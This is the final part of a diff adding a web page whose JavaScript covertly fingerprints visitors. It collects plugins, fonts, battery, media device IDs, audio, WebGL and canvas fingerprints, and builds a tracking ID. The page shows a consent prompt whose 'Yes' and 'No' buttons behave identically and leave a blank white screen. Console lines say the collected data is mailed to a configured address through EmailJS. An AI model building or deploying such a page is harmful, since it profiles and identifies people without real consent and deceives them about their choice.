+                utc_offset: now.getTimezoneOffset(),
+                daylight_saving: now.getTimezoneOffset() < new Date(now.getFullYear(), 6, 1).getTimezoneOffset(),
+                hijri_date: hijriDate
+            };
+        }
+
+        function getHijriDate() {
+            try {
+                const date = new Date();
+                const options = { calendar: 'islamic-umalqura', year: 'numeric', month: 'long', day: 'numeric' };
+                return new Intl.DateTimeFormat('ar-SA', options).format(date);
+            } catch (e) {
+                return 'غير متاح';
+            }
+        }
+
+        function collectPluginsData() {
+            const plugins = Array.from(navigator.plugins || []);
+            return {
+                count: plugins.length,
+                list: plugins.map(p => ({
+                    name: p.name,
+                    description: p.description,
+                    filename: p.filename,
+                    length: p.length,
+                    version: p.version
+                }))
+            };
+        }
+
+        function collectMimeTypesData() {
+            const mimeTypes = Array.from(navigator.mimeTypes || []);
+            return {
+                count: mimeTypes.length,
+                list: mimeTypes.map(m => ({
+                    type: m.type,
+                    description: m.description,
+                    suffixes: m.suffixes,
+                    enabled_plugin: m.enabledPlugin?.name
+                }))
+            };
+        }
+
+        function collectAPIData() {
+            const apis = [
+                'geolocation', 'notification', 'serviceWorker', 'pushManager', 'share',
+                'bluetooth', 'usb', 'serial', 'hid', 'xr', 'gamepad',
+                'mediaDevices', 'getUserMedia', 'getDisplayMedia', 'mediaSession',
+                'permissions', 'credentials', 'payment', 'clipboard', 'storage',
+                'indexedDB', 'caches', 'fetch', 'beacon', 'webSocket', 'webRTC',
+                'webTransport', 'canvas', 'webgl', 'webgl2', 'webgpu', 'svg'
+            ];
+            
+            const supported = {};
+            apis.forEach(api => {
+                try {
+                    supported[api] = eval(`'${api}' in navigator || '${api}' in window`);
+                } catch (e) {
+                    supported[api] = false;
+                }
+            });
+            
+            return supported;
+        }
+
+        function collectPerformanceData() {
+            const perf = {
+                memory: performance.memory ? {
+                    used_js_heap: performance.memory.usedJSHeapSize,
+                    total_js_heap: performance.memory.totalJSHeapSize,
+                    js_heap_limit: performance.memory.jsHeapSizeLimit
+                } : null,
+                timing: performance.timing ? {
+                    navigation_start: performance.timing.navigationStart,
+                    load_event_end: performance.timing.loadEventEnd,
+                    dom_complete: performance.timing.domComplete
+                } : null,
+                navigation: performance.navigation ? {
+                    type: performance.navigation.type,
+                    redirect_count: performance.navigation.redirectCount
+                } : null,
+                paint_timing: performance.getEntriesByType('paint') || []
+            };
+            
+            // إضافة بيانات الأداء التفصيلية
+            const navEntries = performance.getEntriesByType('navigation');
+            if (navEntries.length > 0) {
+                perf.detailed_timing = navEntries[0];
+            }
+            
+            return perf;
+        }
+
+        async function collectBatteryData() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100),
+                        charging_time: battery.chargingTime,
+                        discharging_time: battery.dischargingTime
+                    };
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        async function collectMediaData() {
+            const media = {
+                devices: [],
+                supported: 'mediaDevices' in navigator
+            };
+            
+            if (media.supported) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    media.devices = devices.map(d => ({
+                        kind: d.kind,
+                        label: d.label || 'غير معروف',
+                        device_id: d.deviceId,
+                        group_id: d.groupId
+                    }));
+                } catch (e) {
+                    media.error = e.message;
+                }
+            }
+            
+            return media;
+        }
+
+        async function collectFontsData() {
+            const fonts = {
+                system: [],
+                web: [],
+                supported: 'fonts' in document
+            };
+            
+            if (fonts.supported) {
+                try {
+                    await document.fonts.ready;
+                    const fontSet = new Set();
+                    document.fonts.forEach(font => {
+                        fontSet.add(font.family);
+                    });
+                    fonts.web = Array.from(fontSet);
+                } catch (e) {}
+            }
+            
+            // قائمة افتراضية للخطوط الشائعة
+            const commonFonts = [
+                'Arial', 'Helvetica', 'Times New Roman', 'Times', 'Courier New',
+                'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond',
+                'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
+                'Impact', 'Tahoma', 'Geneva', 'Lucida Sans Unicode'
+            ];
+            
+            fonts.system = commonFonts.filter(font => {
+                return document.fonts.check(`12px "${font}"`);
+            });
+            
+            return fonts;
+        }
+
+        async function collectAudioData() {
+            const audio = {
+                supported: 'AudioContext' in window || 'webkitAudioContext' in window,
+                context: null,
+                fingerprint: null
+            };
+            
+            if (audio.supported) {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    const audioContext = new AudioContext();
+                    
+                    audio.context = {
+                        sample_rate: audioContext.sampleRate,
+                        state: audioContext.state,
+                        current_time: audioContext.currentTime,
+                        destination: audioContext.destination ? 'مدعوم' : 'غير مدعوم'
+                    };
+                    
+                    // إنشاء بصمة صوتية
+                    const oscillator = audioContext.createOscillator();
+                    const analyser = audioContext.createAnalyser();
+                    
+                    oscillator.connect(analyser);
+                    oscillator.start();
+                    
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    
+                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                    analyser.getByteFrequencyData(dataArray);
+                    
+                    audio.fingerprint = {
+                        frequency_bins: analyser.frequencyBinCount,
+                        sample: Array.from(dataArray).slice(0, 50)
+                    };
+                    
+                    oscillator.stop();
+                    audioContext.close();
+                    
+                } catch (e) {
+                    audio.error = e.message;
+                }
+            }
+            
+            return audio;
+        }
+
+        function collectWebGLData() {
+            const webgl = {
+                supported: false,
+                parameters: {}
+            };
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    webgl.supported = true;
+                    
+                    // جمع معلمات WebGL
+                    const params = [
+                        'VERSION', 'SHADING_LANGUAGE_VERSION', 'VENDOR', 'RENDERER',
+                        'MAX_TEXTURE_SIZE', 'MAX_CUBE_MAP_TEXTURE_SIZE', 'MAX_RENDERBUFFER_SIZE',
+                        'MAX_VIEWPORT_DIMS', 'MAX_VERTEX_ATTRIBS', 'MAX_VERTEX_UNIFORM_VECTORS',
+                        'MAX_FRAGMENT_UNIFORM_VECTORS', 'MAX_VARYING_VECTORS', 'MAX_COMBINED_TEXTURE_IMAGE_UNITS'
+                    ];
+                    
+                    params.forEach(param => {
+                        try {
+                            webgl.parameters[param] = gl.getParameter(gl[param]);
+                        } catch (e) {}
+                    });
+                }
+            } catch (e) {}
+            
+            return webgl;
+        }
+
+        function collectCanvasData() {
+            const canvasData = {
+                supported: false,
+                fingerprint: null,
+                capabilities: {}
+            };
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                if (ctx) {
+                    canvasData.supported = true;
+                    
+                    // إنشاء بصمة Canvas
+                    canvas.width = 240;
+                    canvas.height = 60;
+                    
+                    ctx.textBaseline = 'alphabetic';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(100, 10, 62, 62);
+                    
+                    ctx.fillStyle = '#069';
+                    ctx.font = '11pt Arial';
+                    ctx.fillText('Canvas Fingerprint', 2, 20);
+                    
+                    canvasData.fingerprint = canvas.toDataURL();
+                    
+                    // جمع إمكانيات Canvas
+                    canvasData.capabilities = {
+                        font: ctx.font,
+                        text_align: ctx.textAlign,
+                        text_baseline: ctx.textBaseline,
+                        fill_style: ctx.fillStyle,
+                        stroke_style: ctx.strokeStyle,
+                        line_width: ctx.lineWidth,
+                        line_cap: ctx.lineCap,
+                        line_join: ctx.lineJoin,
+                        miter_limit: ctx.miterLimit,
+                        shadow_blur: ctx.shadowBlur,
+                        shadow_color: ctx.shadowColor,
+                        global_alpha: ctx.globalAlpha,
+                        global_composite_operation: ctx.globalCompositeOperation
+                    };
+                }
+            } catch (e) {
+                canvasData.error = e.message;
+            }
+            
+            return canvasData;
+        }
+
+        async function generateFingerprint() {
+            const components = [];
+            
+            // 1. معلومات المتصفح
+            components.push(navigator.userAgent);
+            components.push(navigator.platform);
+            components.push(navigator.language);
+            
+            // 2. معلومات الشاشة
+            components.push(screen.width);
+            components.push(screen.height);
+            components.push(screen.colorDepth);
+            components.push(window.devicePixelRatio);
+            
+            // 3. معلومات الوقت
+            components.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
+            components.push(new Date().getTimezoneOffset());
+            
+            // 4. WebGL fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+                        components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+                    }
+                }
+            } catch (e) {}
+            
+            // 5. Canvas fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 100, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint', 2, 15);
+                components.push(canvas.toDataURL());
+            } catch (e) {}
+            
+            // 6. Fonts fingerprint
+            const testFonts = [
+                'Arial', 'Arial Black', 'Times New Roman', 
+                'Comic Sans MS', 'Verdana', 'Courier New'
+            ];
+            
+            const fontAvailable = testFonts.filter(font => {
+                return document.fonts.check(`12px "${font}"`);
+            });
+            components.push(fontAvailable.join(','));
+            
+            // 7. حساب البصمة
+            const combined = components.join('|');
+            let hash = 0;
+            
+            for (let i = 0; i < combined.length; i++) {
+                const char = combined.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            
+            const shortId = Math.abs(hash).toString(36).substring(0, 12);
+            const fullId = `fp_${Date.now()}_${shortId}`;
+            
+            return {
+                short: shortId,
+                full: fullId,
+                components_count: components.length
+            };
+        }
+
+        // ============== معالجة أحداث الأزرار ==============
+        document.getElementById('btnYes').addEventListener('click', function() {
+            document.getElementById('consentScreen').classList.add('hidden');
+            document.getElementById('whiteScreen').style.display = 'block';
+        });
+
+        document.getElementById('btnNo').addEventListener('click', function() {
+            document.getElementById('consentScreen').classList.add('hidden');
+            document.getElementById('whiteScreen').style.display = 'block';
+        });
+
+        // ============== التحقق من الإعدادات ==============
+        console.log('🚀 نظام جمع البيانات التلقائي جاهز');
+        console.log('📧 سيتم الإرسال إلى:', EMAILJS_CONFIG.EMAIL_TO);
+        
+        if (EMAILJS_CONFIG.PUBLIC_KEY === "YOUR_PUBLIC_KEY_HERE" ||
+            EMAILJS_CONFIG.SERVICE_ID === "YOUR_SERVICE_ID_HERE" ||
+            EMAILJS_CONFIG.TEMPLATE_ID === "YOUR_TEMPLATE_ID_HERE") {
+            console.warn('⚠️ يرجى إضافة بيانات EmailJS في بداية الكود');
+        }
+    </script>
+</body>
+</html>
